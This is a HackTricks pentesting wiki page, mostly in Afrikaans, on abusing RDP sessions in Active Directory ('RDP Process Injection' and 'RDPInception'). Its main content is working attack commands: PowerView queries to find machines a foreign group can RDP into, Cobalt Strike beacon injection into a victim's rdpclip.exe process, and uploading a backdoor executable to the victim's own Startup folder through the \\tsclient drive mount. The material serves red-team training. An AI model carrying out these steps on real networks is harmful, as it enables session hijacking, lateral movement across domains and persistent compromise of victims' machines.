# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Proses Inspuiting

As die **buitelandse groep** **RDP-toegang** tot enige **rekenaar** in die huidige domein het, kan 'n **aanvaller** daardie rekenaar **kompromitteer en op hom wag**.

Sodra daardie gebruiker via RDP toegang verkry het, kan die **aanvaller na daardie gebruiker se sessie pivot** en sy toestemmings in die buitelandse domein misbruik.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Kontroleer **ander maniere om sessies te steel met ander gereedskap** [**op hierdie bladsy.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

As 'n gebruiker via **RDP in 'n masjien** toegang verkry waar 'n **aanvaller** op hom **wag**, sal die aanvaller in staat wees om 'n **beacon in die RDP-sessie van die gebruiker** te **injekteer** en as die **slagoffer sy skyf gemonteer het** toe hy via RDP toegang verkry, kan die **aanvaller dit toegang**.

In hierdie geval kan jy net die **slagoffers** **oorspronklike rekenaar** **kompromitteer** deur 'n **backdoor** in die **opstartgids** te skryf.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
